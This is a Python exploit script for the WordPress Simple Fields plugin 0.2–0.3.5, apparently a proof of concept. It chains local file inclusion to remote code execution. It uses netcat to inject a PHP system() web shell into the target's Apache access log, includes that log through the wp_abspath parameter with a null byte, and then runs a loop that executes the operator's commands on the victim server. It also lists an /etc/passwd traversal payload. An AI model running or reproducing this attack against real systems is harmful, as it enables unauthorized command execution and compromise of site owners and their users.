#!/usr/bin/env python
# -*- coding: utf- 8 -*-
import requests 
import os
import sys, getopt
from urlparse import urlparse
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def help():
   print bcolors.HEADER + """
####################################################
          _                ____             
         | |              |  _ \            
         | | ___  ___  ___| |_) | ___  ___  
     _   | |/ _ \/ __|/ _ \  _ < / _ \/ _ \ 
    | |__| | (_) \__ \  __/ |_) |  __/ (_) |
     \____/ \___/|___/\___|____/ \___|\___/ 

                                    http://phucdt.cf
####################################################                                         
   """ + bcolors.ENDC
   print bcolors.OKGREEN +"""
 * @Name          WordPress Plugin Simple Fields 0.2 - 0.3.5
 * @Vul           Local/Remote File Inclusion / Remote Code Execution
 * @Framework     WordPress
 * @CVE           null
 * @Version       0.2 - 0.3.5
 * @Description:  Versions 0.2 to 0.3.5 of the Simple Fields WordPress 
                  plugin are vulnerable to local file inclusion if running
                  on PHP <5.3.4. This can even lead to remote code execution,
                  for example by injecting php code into the apache logs
                  or if allow_url_include is turned on in php.ini.
                  This PoC allow RCE
 * @Payload:      http://host/wordpress/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
 * @Usage:        VT-2018-01037.py -u <host> -p <port> -i <path>
                  <host>: The URL to vuln site. Exp: http://abc.xyz
                  <path>: The path to access_log file.
                     Exp:   "../../../../../logs/access_log"
                     default value of <path> is:
                     "../../../../../logs/access_log"
   """ + bcolors.ENDC

def getDomainfromURI(uri):
   parsed_uri = urlparse(uri)
   domain = '{uri.netloc}'.format(uri=parsed_uri)
   return domain

def main(argv):
   url = ''
   port = ''
   path = '../../../../../logs/access_log'

   try:
      opts, args = getopt.getopt(argv,"hu:p:i:",["url=","path="])
   except getopt.GetoptError:
      print sys.argv[0]+' -u <host> -p <port> -i <path>'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print sys.argv[0]+' -u <host> -p <port> -i <path>'
         sys.exit()
      elif opt in ("-u", "--url"):
         url = arg
      elif opt in ("-p"):
         port = arg
      elif opt in ("-i", "--path"):
         path = arg
   if(url =='' or port ==''):
      print bcolors.WARNING+ 'Please insert <host> and <port>'+bcolors.ENDC
      return

   LFI = url + '/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath='
   # add vuln code to access log on victim server
   test = "echo \"<?system(\$_POST['cmd'])?>\""+" |nc "+getDomainfromURI(url)+" " +port
   print bcolors.FAIL + test + bcolors.ENDC
   os.system(test)
   # LFI to RCE
   proxy = {'http': 'http://127.0.0.1:8080'}
   while 1:
      target = LFI+path+'%00'
      cmd = raw_input(bcolors.OKBLUE + 'cmd: ' + bcolors.ENDC)
      data = {'cmd':'echo asd123&& '+cmd+' &&echo bvc123'}
      r = requests.post(target, data=data,proxies=proxy)
      try:
         a=(r.text).index('asd123')
         b=(r.text).index('bvc123')
         print r.text[a+6:b]
      except:
         print "can't run!"


if __name__ == "__main__":
   help()
   main(sys.argv[1:])